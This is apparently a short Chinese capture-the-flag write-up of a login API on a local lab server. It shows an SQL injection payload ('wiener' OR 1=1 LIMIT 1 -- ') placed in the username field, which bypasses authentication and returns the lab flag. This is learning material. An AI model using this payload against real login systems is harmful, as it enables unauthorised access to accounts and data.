使用登录功能
- 请求
    ```http
    POST /api/v1/login/ HTTP/1.1
    Host: 127.0.0.1:8000

    {
        "username": "wiener",
        "password": "peter"
    }
    ```
    - 响应
        ```json
        {
            "status":"fail"
        }
        ```

- 提交 SQL 载荷
    ```json
    {
        "username": "wiener' OR 1=1 LIMIT 1 -- ",
        "password": "peter"
    }
    ```
    - 响应
        ```json
        {
            "flag": "ECSC{889b71de2017ca8074f49d3f853950e147591b38}",
            "status": "success"
        }
        ```

- 此处无法使用单引号触发异常判断是否存在 SQLi
